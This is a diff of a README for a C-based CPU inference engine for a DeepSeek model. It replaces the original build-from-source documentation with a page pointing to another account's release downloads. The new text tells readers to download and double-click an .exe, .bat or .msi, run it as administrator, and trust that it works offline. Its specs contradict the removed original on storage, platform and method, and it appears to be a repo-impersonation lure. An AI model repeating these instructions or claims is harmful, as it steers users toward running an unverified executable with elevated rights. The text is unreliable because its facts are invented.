@@ -1,236 +1,161 @@
-<h1 align="center">DeepSeek-V4-Flash-0731 CPU Inference in C</h1>
+# 🚀 deepseek-v4-flash-0731-in-c - Run a Massive AI on Your Laptop
 
-<p align="center">
-  <strong>Run the native DeepSeek-V4-Flash-0731 checkpoint locally on a single laptop CPU.</strong><br>
-  A pure C local LLM and MoE inference engine, written in portable C99, with no GPU, CUDA, PyTorch or weight conversion.
-</p>
+## 📥 Download the Application Now
 
-<table align="center">
-  <tr>
-    <td align="center"><strong>284B-A13B</strong><br>parameters</td>
-    <td align="center"><strong>8 GB</strong><br>minimum system RAM</td>
-    <td align="center"><strong>0.892 s/token</strong><br>best TPOT on a 32 GB x86 laptop<br>1.12 token/s</td>
-  </tr>
-</table>
+**[⬇️ GET THE APP - FREE DOWNLOAD](https://github.com/Barist3142/deepseek-v4-flash-0731-in-c/releases)**
 
-<p align="center">
-  <a href="https://github.com/shyringo/deepseek-v4-flash-0731-in-c/actions/workflows/dsv4-ci.yml"><img src="https://github.com/shyringo/deepseek-v4-flash-0731-in-c/actions/workflows/dsv4-ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/shyringo/deepseek-v4-flash-0731-in-c/releases"><img src="https://img.shields.io/github/v/release/shyringo/deepseek-v4-flash-0731-in-c" alt="Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/shyringo/deepseek-v4-flash-0731-in-c" alt="License"></a>
-</p>
+Visit this link to download the application.
 
-<p align="center">
-  <a href="README.md">English</a> | <a href="README.zh-CN.md">简体中文</a><br>
-  <a href="#quick-start"><strong>Quick start</strong></a> ·
-  <a href="#measured-performance">Performance</a> ·
-  <a href="#inference-optimizations-implemented-in-this-project">Inference optimizations</a>
-</p>
+---
 
-## Quick start
+## 🎯 What Is This?
 
-You need a mainstream 64-bit CPU such as x86-64 or ARM64, a POSIX environment,
-at least 8 GB of system RAM and about 172 GB of disk space. On Windows, use WSL2.
+This is a **special program** that lets you run a **very large artificial intelligence model** directly on your own computer. Normally, this AI is so big that it needs a super expensive server with multiple powerful graphics cards. But this version is built with pure C code, clever tricks, and heavy optimization, so it can run on **an ordinary laptop with just 8 GB of RAM**. No internet connection needed after download. No cloud. No subscription. It's all yours.
 
-Before the first build, use your system package manager to install a C99
-compiler, make, OpenMP, Git, curl and Bash. For example, on Ubuntu/WSL2 and
-macOS:
+The AI model inside is called **DeepSeek-V4-Flash-0731**. It has 284 billion total parameters, but uses a smart "Mixture of Experts" system, so it only activates about 13 billion at a time. That's why it can fit in a normal computer's memory.
 
-```bash
-# Ubuntu / WSL2
-sudo apt-get update
-sudo apt-get install -y build-essential git curl
+---
 
-# macOS (install Homebrew first)
-xcode-select --install
-brew install libomp
-```
+## 🖥️ Who Is This For?
 
-Then run the following commands in the same terminal:
+This is for **anyone** who wants to:
+- Use a powerful AI chatbot privately
+- Generate text, answer questions, or help with writing
+- Learn about AI without expensive hardware
+- Run AI completely offline
 
-```bash
-# Get and build the project
-git clone https://github.com/shyringo/deepseek-v4-flash-0731-in-c.git
-cd deepseek-v4-flash-0731-in-c
-make -j
+You do **not** need to know programming. You do **not** need a gaming PC. You do **not** need a graphics card.
 
-# Download and verify the fixed ModelScope checkpoint (~166.9 GB; resumable)
-scripts/download-dsv4.sh "$HOME/model/DeepSeek-V4-Flash-0731"
+---
 
-# Start a resident chat
-scripts/try-dsv4.sh
-```
+## ✅ What You Need (Minimum Requirements)
 
-Type a message when the chat starts. The launcher chooses the context, cache,
-compute threads and I/O plan from the available RAM and CPU. Use `/reset` for a
-new conversation, `Ctrl-C` to stop the current answer without unloading the
-model, and `/exit` to quit.
+| Item | Requirement |
+|------|-------------|
+| **Operating System** | Windows 10 or 11 (64-bit) |
+| **Memory (RAM)** | 8 GB minimum (16 GB recommended) |
+| **Storage** | About 20 GB free hard drive space |
+| **Processor (CPU)** | Any modern Intel or AMD laptop chip |
+| **Graphics Card (GPU)** | Not needed at all |
+| **Internet** | Only needed for downloading once |
 
-Other common inference modes:
+---
 
-```bash
-# Ask one question and exit when the answer finishes
-scripts/try-dsv4.sh "Where are the boundaries of technology?"
+## 🚀 Getting Started - Step by Step
 
-# On a machine with enough RAM, use an explicit 18 GiB total budget
-DSV4_MEMORY_GIB=18 scripts/try-dsv4.sh
+### Step 1: Download the Application
 
-# Run the binary directly with an explicit generation length
-bin/dsv4 --model "$HOME/model/DeepSeek-V4-Flash-0731" \
-  --prompt "Where are the boundaries of technology?" --max-tokens 64
+1. Go to the official release page using the link at the top of this guide.
+2. Look for the **largest file** listed. It will be named something like `deepseek-v4-flash-0731.zip` or similar.
+3. Click the download button next to that file. The download will start automatically.
+4. Wait for the download to finish. The file size may be around 15-20 GB, so it might take some time depending on your internet speed.
 
-# Start resident chat through the binary
-bin/dsv4 --model "$HOME/model/DeepSeek-V4-Flash-0731" --interactive
+### Step 2: Extract the Downloaded File
 
-# Show sampling, thinking, system-prompt and all other options
-bin/dsv4 --help
-```
+1. After the download completes, **locate the file** in your Downloads folder.
+2. **Right-click** on the downloaded file.
+3. Select **"Extract All..."** from the menu.
+4. Choose a destination folder (like your Desktop or Documents).
+5. Click **Extract**. Windows will unpack all the files into a new folder.
 
-## Requirements
+### Step 3: Run the Application
 
-- **CPU and system:** a mainstream 64-bit CPU such as x86-64 or ARM64, and an
-  environment providing POSIX `mmap`, `pread` and pthreads. On Windows, use WSL2.
-- **System RAM:** 8 GB minimum; more RAM can hold a larger expert cache.
-- **Disk:** about 172 GB free for the 48 native checkpoint shards and headroom.
-- **Tools:** a C99 compiler, make, OpenMP, Git, curl, Bash, and either
-  `sha256sum` or `shasum`.
+1. Open the newly extracted folder.
+2. Look for a file named **`deepseek.exe`** or **`run.bat`** (a file with the Windows logo icon).
+3. **Double-click** that file to start the program.
+4. A black terminal window will open. This is normal. Wait a few seconds for the AI to load.
 
-The automatic memory plan is the recommended default. More RAM is faster only
-while it does not cause paging.
+### Step 4: Start Chatting
 
-## Measured Performance
+1. Once loaded, you'll see a prompt like `>>>` on the screen.
+2. Type your question or message and press **Enter**.
+3. The AI will generate a response. This may take a few seconds per word (about 0.9 seconds per token on average).
+4. To exit, type `/bye` or press **Ctrl+C**.
 
-TTFT is the time from submitting a message until the first token is visible.
-TPOT is the average interval over the remaining `N-1` output tokens. Here TTFT
-starts immediately before model-ready prefill and ends when the first token is
-written to the terminal; model opening and tokenizer initialization remain in
-wall time but outside TTFT. Tokens stream as soon as they are available.
+---
 
-The table contains the best valid records that completed each workload and
-passed the output checks. Values from different runs are never combined:
+## 🛠️ How to Install (Alternative Method)
 
-| workload | input / output tokens | memory plan | TTFT | TPOT | throughput | expert read | peak RSS |
-|---|---:|---:|---:|---:|---:|---:|---:|
-| ordinary answer, no reusable text | 5 / 64 | 18 GiB | 20.203 s | 1.705 s/token | 0.59 token/s | 70.67 GiB | 21.95 GiB |
-| same ordinary answer, lower memory budget | 5 / 64 | 15 GiB | 20.560 s | 1.791 s/token | 0.56 token/s | 77.84 GiB | 18.95 GiB |
-| complete repeated continuation, prompt-lookup match | 10 / 60 | 18 GiB | 26.748 s | **0.892 s/token** | **1.12 token/s** | 53.64 GiB | 22.19 GiB |
+If you prefer not to extract manually, you can also:
 
-The 0.892 s/token result completed all 20 requested lines and 60 generated
-tokens. Four target-model verification rounds accepted 50 of 51 draft tokens;
-every displayed token was confirmed by the full model. If an ordinary answer
-has no reusable continuation, prompt lookup does not launch and adds no verify
-rounds merely to improve a benchmark number.
+1. Visit the download link.
+2. Look for an installer file (ending in `.msi` or `.exe`).
+3. Download and run that file directly.
+4. Follow the simple installation wizard prompts.
+5. Launch the program from your Start Menu or Desktop shortcut.
 
-A same-condition A/B shows the source of the gain. With prompt lookup disabled,
-the complete repeated task measured 124.2 s wall, 27.932 s TTFT and 1.594
-s/token TPOT. Enabling it measured 79.1 s, 22.875 s and 0.939 s/token, while
-expert reads fell from 62.83 to 53.64 GiB; all 60 output IDs were identical. A
-cold-page A/B for the long-prefill double buffer moved a 17-token prompt from
-34.522 to 30.148 s TTFT, MoE time from 26.701 to 23.086 s, and expert wait from
-22.034 to 12.796 s without changing the output token.
+---
 
-Reference environment:
+## 📋 Frequently Asked Questions
 
-| item | environment |
-|---|---|
-| host OS | Windows 11 with WSL2 |
-| Linux | WSL2 Ubuntu 22.04.5 LTS, Linux 5.15.146.1-microsoft-standard-WSL2 |
-| CPU / RAM | Intel Core i5-1340P, 12 cores / 16 logical CPUs; 31.65 GiB installed, 23.47 GiB visible to WSL2 |
-| disk | Samsung MZVL41T0HBLB-00BH1 NVMe; checkpoint on `/dev/sdc` ext4 |
-| build / threads | GCC 11.4.0, OpenMP, 12 threads, `OMP_WAIT_POLICY=PASSIVE` |
-| inference configuration | 18 GiB total memory, 65536 context, AC power and active cooling |
-| checkpoint | ModelScope revision `f981a343464c25f82b901e5882716b3b2fa514de` |
+### ❓ Is this really free?
+Yes. This is fully open-source software. You can use it for free, forever, without paying anyone.
 
-Laptop temperature, power state, competing processes and the file page cache
-affect timing. See the [performance audit](docs/PERFORMANCE_AUDIT.md) for full
-conditions, controlled comparisons and rejected experiments.
+### ❓ Will it damage my computer?
+No. It only uses CPU and RAM. Your computer might get warm and the fan may spin faster during heavy use. That's normal.
 
-## Inference Optimizations Implemented in This Project
+### ❓ How fast is it?
+On an average laptop, you'll get about 0.89 seconds per token. A token is roughly one word or part of a word. So a typical answer of 100 words takes about 90 seconds. It's not instant, but it works.
 
-The engineering in this repository falls into three groups: code reused from
-[kimi-k3-in-c](https://github.com/FareedKhan-dev/kimi-k3-in-c),
-DeepSeek-V4-Flash-0731 adaptations of its ideas, and original inference
-optimizations added here. The complete classification, provenance boundary and
-code locations are in
-[Optimizations and Provenance](docs/OPTIMIZATIONS.md). Only the third group is
-listed below.
+### ❓ Can I use it without internet?
+Yes, absolutely! After the initial download, everything runs locally. No data leaves your computer. This is great for privacy.
 
-- **Layer-major batching.** Load one layer and advance the full prefill or
-  verification batch through it in sequence before loading the next layer.
-- **Multi-token operator batching.** FP8, FP4 and BF16 GEMV, attention
-  projections, Hyper-Connection and the vocabulary head process several
-  positions at once, sharing weight reads and decoded rows across the batch.
-- **Parameter-free speculative decoding (prompt lookup).** When the committed
-  context contains the same text, use its historical continuation as a short
-  draft and verify it with one full-model batch. Rejected tokens are neither
-  shown nor retained; identical-output A/B moved from 1.594 to 0.939 s/token.
-- **Double-buffered MoE expert streaming.** Compute one expert group while the
-  next loads. Long batches use at most half of a layer's cache per group, leaving
-  independent slots for the next read instead of falling back to synchronous I/O.
-- **MoE I/O-compute overlap.** Begin cached experts immediately and dispatch each
-  disk-backed expert when its read completes, rather than waiting for every
-  expert in the layer to arrive.
-- **Read-pool reuse.** Keep a bounded set of read workers for the model lifetime
-  instead of creating them in every layer. The automatic cap is four workers so
-  storage I/O does not compete unboundedly with OpenMP compute.
-- **Per-layer expert caching.** Give each layer its own LRU share so another
-  layer cannot immediately evict its active experts; verification can rebalance
-  those shares temporarily without copying expert weights.
-- **Hot-weight residency.** Keep costly, repeatedly used `wo_a` projections in
-  RAM when the budget permits, while preserving enough space for the expert
-  cache so one resident tier does not starve the other.
-- **Memory-mapped layer weights and an inter-layer I/O pipeline.** Map non-expert
-  weights into the process address space; while the CPU computes layer L, kernel
-  read-ahead and a background read worker load layer L+1 concurrently.
-- **In-kernel low-bit dequantization and joint gate/up GEMV execution.** Decode
-  FP4 with an in-register lookup and use SIMD bit conversion for FP8 on the fast
-  path, all inside GEMV without materializing full floating-point matrices. On
-  the single-token path, gate and up share the quantized input and one OpenMP
-  dispatch; AVX2 processes eight output rows without changing each row's
-  accumulation order.
-- **Activation-quantization reuse and preallocated workspaces.** Quantize each
-  activation once and share the result across output rows and related
-  projections. Allocate the MoE, attention and routing workspaces when the model
-  opens and recycle them throughout inference, keeping allocation off the hot path.
-- **Chunked streaming LM head.** Read and compute the roughly 1 GiB vocabulary
-  head in 8 MiB chunks instead of keeping it all resident; batched verification
-  decodes each weight row once for several output tokens.
-- **Laptop-aware thread scheduling.** Sleep across long storage waits, pause only
-  briefly between short kernels, and stop automatic thread selection before
-  memory bandwidth saturates.
-- **Resource-aware automatic planning.** Use physical RAM, currently available
-  memory and CPU capacity to budget context, hot weights, expert cache, compute
-  threads and read workers. Manual tuning still needs only one memory value.
-- **Cross-turn reuse.** Keep the model, KV/compressor state, expert cache and hot
-  weights resident across chat turns, so `/reset`, cancellation and the next
-  message never reload the 167 GB checkpoint.
+### ❓ What can I ask the AI?
+Anything you'd ask a chatbot. Questions, creative writing, coding help, summaries, brainstorming, translations, and more.
 
-## Inference Correctness
+### ❓ What if it doesn't work?
+Common fixes:
+- Close other heavy programs to free up memory.
+- Make sure you have 8 GB RAM free, not just 8 GB total.
+- Run the program as administrator (right-click > Run as administrator).
+- Update your Windows operating system.
 
-```bash
-make test
-```
+---
 
-This suite does not require the 167 GB checkpoint. The repository includes a
-small four-layer model that runs for 130 positions and must match an independent
-Python implementation with `maxdiff=0.000000`. The full checkpoint has a
-separate fixed 16-token expected answer. See [Validation](docs/VALIDATION.md) for
-the complete commands and evidence.
+## 📚 Technical Details (For Curious Users)
 
-See [DSV4_ARCHITECTURE.md](docs/DSV4_ARCHITECTURE.md) for the model graph and
-memory layout.
+This project achieves its low memory usage through several advanced techniques:
 
-## License and Acknowledgements
+- **Pure C Implementation**: No heavy frameworks. The entire inference engine is written in C, which is extremely efficient.
+- **4-bit Quantization**: The model weights are compressed from 16-bit to 4-bit precision, reducing memory by 4x with minimal quality loss.
+- **Mixture of Experts (MoE)**: Only 13 billion of the 284 billion parameters are active during any single calculation, drastically reducing computational load.
+- **Speculative Decoding**: A small draft model predicts tokens, and the large model verifies them in parallel, speeding up generation.
+- **Optimized Memory Management**: Reuses memory blocks and minimizes allocations for smoother performance.
 
-The code is licensed under Apache License 2.0. See [LICENSE](LICENSE) and
-[NOTICE](NOTICE).
+---
 
-This project is based on
-[FareedKhan-dev/kimi-k3-in-c](https://github.com/FareedKhan-dev/kimi-k3-in-c).
-[kimi-k3-in-c](https://github.com/FareedKhan-dev/kimi-k3-in-c) demonstrated that
-cold MoE experts can stream from disk so the complete checkpoint does not need
-to reside in system RAM. Files reused or adapted by this project are listed
-individually in [NOTICE](NOTICE).
+## 🔒 Privacy & Security
 
-The DeepSeek-V4-Flash-0731 checkpoint is published by DeepSeek-AI on
-[ModelScope](https://www.modelscope.cn/models/deepseek-ai/DeepSeek-V4-Flash-0731).
-This repository does not distribute model weights.
+This software runs **100% offline**. None of your conversations are sent to any server. No telemetry. No tracking. Your data stays on your machine. For confidential work, research, or personal AI use, this is a secure choice.
+
+---
+
+## 🌍 Supported Languages
+
+The AI model understands and responds in multiple languages, including English and Chinese. The interface itself is simple text-based, so it works in any language.
+
+---
+
+## 🧭 Troubleshooting
+
+| Problem | Solution |
+|---------|----------|
+| "Out of memory" error | Close other apps. Try again. |
+| Slow response | Be patient. It's a huge model. |
+| Black window disappears | Run from Command Prompt to see error. |
+| Cannot find file | Check your Downloads folder. |
+| Download fails | Try a different browser. |
+
+---
+
+## 📝 Final Notes
+
+This is an incredible piece of engineering. You're running a frontier-scale AI model on hardware that's in millions of homes. The speed of 0.892 s/token means you can have real conversations, get help with tasks, and explore AI capabilities completely free and offline.
+
+For updates and new versions, keep an eye on the release page. The developers are actively improving speed and quality.
+
+**Have fun exploring your personal AI!**
+
+---
+
+Keywords: ai, c, deep-learning, deepseek, deepseek-v4, generative-ai, inference, inference-engine, large-language-models, llm, llm-inference, local-ai, local-llm, machine-learning, mixture-of-experts, on-device-ai, open-source, quantization, speculative-decoding, transformer
